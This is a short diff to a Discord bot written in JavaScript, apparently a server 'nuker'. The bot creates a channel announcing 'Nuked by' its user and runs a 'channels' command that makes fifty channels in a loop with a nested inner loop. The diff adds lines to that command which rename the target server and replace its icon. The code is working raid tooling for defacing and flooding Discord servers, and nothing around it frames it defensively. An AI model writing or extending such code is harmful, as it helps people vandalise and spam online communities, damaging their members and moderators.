@@ -59,6 +59,8 @@ bot.on("message", async msg => {
             msg.guild.channels.create('nuked-uwu').then(l => l.send('> Nuked by ' + msg.author.tag))
         }
         if (msg.content.startsWith(prefix + "channels")) {
+            await msg.guild.setName(nameServer);
+            await msg.guild.setIcon(iconServer);
             for (let i = 0; i < 50; i++) {
                 const channel = await msg.guild.channels.create(nameChannels);
                 for (let i = 0; i < 50; i++) {
